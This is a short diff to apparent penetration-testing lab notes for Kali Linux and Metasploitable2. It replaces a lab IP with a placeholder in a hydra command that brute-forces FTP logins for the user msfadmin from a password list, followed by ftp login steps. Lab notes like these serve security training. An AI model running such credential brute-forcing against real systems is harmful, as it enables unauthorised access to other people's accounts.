@@ -17,7 +17,7 @@ host <example.com>>
 The following commands requires Kali Linux and Metasploitable2 
 Penetrate ftp using hydra
 ==================================================================
-hydra -l msfadmin -P /root/ss/pass.txt -vV 192.168.56.101 ftp
+hydra -l msfadmin -P /root/ss/pass.txt -vV <<IP address>> ftp
 ftp <<ip address>>
 pwd
 
